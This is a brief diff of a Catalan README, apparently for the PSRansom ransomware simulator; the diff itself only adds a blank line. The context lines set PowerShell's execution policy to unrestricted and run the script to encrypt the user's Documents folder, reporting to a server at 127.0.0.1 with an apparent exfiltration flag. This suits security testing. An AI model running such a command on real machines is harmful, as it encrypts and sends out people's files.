@@ -34,3 +34,4 @@ Set-ExecutionPolicy -ExecutionPolicy unrestricted
 4. Obre una consola de PoweShell a la carpeta on hagis descarregat l'script i executa'l amb la següent ordre:
 
 .\PSRansom.ps1 -e C:\Users\%USERNAME%\Documents -s 127.0.0.1 -p 80 -x
+
